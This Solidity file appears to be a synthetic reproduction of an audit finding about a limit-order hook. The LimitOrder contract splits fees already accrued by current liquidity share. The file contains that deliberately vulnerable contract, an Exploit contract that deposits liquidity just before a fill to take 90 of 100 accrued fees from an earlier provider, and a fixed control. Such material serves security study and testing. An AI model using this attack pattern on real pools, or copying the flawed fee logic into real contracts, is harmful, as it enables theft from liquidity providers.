// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  OpenZeppelin LimitOrderHook — fees already accrued are split by liquidity
    share at fill time (OpenZeppelin, finding #61378, May 2025).

    SYNTHETIC, cheatcode-free. An existing order has 10 liquidity and 100 FEE
    accrued. The attacker adds 90 in the same block, crosses the tick, and
    withdraws 90 FEE. The earlier LP is left with 10. Control snapshots the
    fee index at deposit, so the attacker receives 0 and the earlier LP
    receives 100. */

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LimitOrder {
    Token public feeToken;
    uint256 public liquidity;
    uint256 public fees;
    bool public filled;
    mapping(address => uint256) public liqOf;

    constructor(Token _feeToken) {
        feeToken = _feeToken;
    }

    function syncFees(uint256 amount) external {
        require(fees == 0 && !filled, "fees");
        require(feeToken.balanceOf(address(this)) == amount, "bal");
        fees = amount;
    }

    function place(address lp, uint256 amount) external {
        require(!filled, "filled");
        liquidity += amount;
        liqOf[lp] += amount;
    }

    function crossTick() external {
        require(liquidity > 0, "empty");
        filled = true;
    }

    function withdraw(address lp) external returns (uint256 payout) {
        require(filled, "open");
        uint256 share = liqOf[lp];
        require(share > 0, "share");
        // @> VULN: fees accrued before this liquidity are split by current share
        payout = fees * share / liquidity;
        fees -= payout;
        liquidity -= share;
        liqOf[lp] = 0;
        if (payout != 0) feeToken.transfer(lp, payout);
    }
}

contract Exploit {
    uint256 public constant HONEST = 10 ether;
    uint256 public constant ATTACK = 90 ether;
    uint256 public constant FEES = 100 ether;

    Token public feeToken;
    LimitOrder public book;
    address public honest;
    uint256 public attackerGot;
    uint256 public honestGot;

    constructor() {
        feeToken = new Token("Fee", "FEE", 18);
        book = new LimitOrder(feeToken);
        honest = address(new Honest());
        book.place(honest, HONEST);
        feeToken.mint(address(book), FEES);
        book.syncFees(FEES);
    }

    function run() external {
        book.place(address(this), ATTACK);
        book.crossTick();
        attackerGot = book.withdraw(address(this));
        honestGot = book.withdraw(honest);
        require(attackerGot == ATTACK, "attacker did not take 90");
        require(honestGot == HONEST, "honest LP was not left with 10");
        require(feeToken.balanceOf(address(this)) == ATTACK, "fee balance");
    }
}

contract Honest {}

/// @dev Control: a deposit snapshots the fee index and only earns fees after that.
contract LimitOrderFixed {
    uint256 public constant UNIT = 1e18;

    Token public feeToken;
    uint256 public liquidity;
    uint256 public feeIndex;
    bool public filled;
    mapping(address => uint256) public liqOf;
    mapping(address => uint256) public paidIndex;

    constructor(Token _feeToken) {
        feeToken = _feeToken;
    }

    function place(address lp, uint256 amount) external {
        require(!filled, "filled");
        liquidity += amount;
        liqOf[lp] += amount;
        paidIndex[lp] = feeIndex;
    }

    function accrue(uint256 amount) external {
        feeToken.transferFrom(msg.sender, address(this), amount);
        feeIndex += amount * UNIT / liquidity;
    }

    function crossTick() external {
        filled = true;
    }

    function withdraw(address lp) external returns (uint256 payout) {
        require(filled, "open");
        uint256 share = liqOf[lp];
        payout = share * (feeIndex - paidIndex[lp]) / UNIT;
        liqOf[lp] = 0;
        liquidity -= share;
        if (payout != 0) feeToken.transfer(lp, payout);
    }
}
